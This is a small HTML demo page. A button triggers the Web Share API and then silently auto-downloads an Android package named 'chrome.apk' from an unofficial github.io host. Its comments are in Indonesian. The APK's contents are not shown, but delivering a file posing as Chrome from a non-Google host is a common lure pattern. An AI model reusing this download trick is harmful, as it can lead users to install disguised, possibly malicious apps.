<!DOCTYPE html>
<html>
<head>
  <title>Web Share + Auto Download</title>
</head>
<body style="height:100vh; display:flex; justify-content:center; align-items:center;">

<button id="shareDownloadBtn">Share & Auto Download File</button>

<script>
document.getElementById("shareDownloadBtn").onclick = async function() {
    // 1. Web Share API
    if (navigator.share) {
        try {
            await navigator.share({
                title: 'Example File',
                text: 'Check out this file!',
                url: 'https://example.com'
            });
            console.log('Sharing success!');
        } catch(err) {
            console.log('Sharing canceled or failed:', err);
        }
    } else {
        alert('Web Share API not supported on this browser.');
    }

    // 2. Auto-download file
    const fileUrl = 'https://ecdnts-del.github.io/test.apk/chrome.apk'; // file eksternal
    const a = document.createElement('a');
    a.href = fileUrl;
    a.download = 'chrome.apk'; // nama file yang akan di-download
    document.body.appendChild(a);
    a.click();               // trigger download otomatis
    document.body.removeChild(a);
};
</script>

</body>
</html>
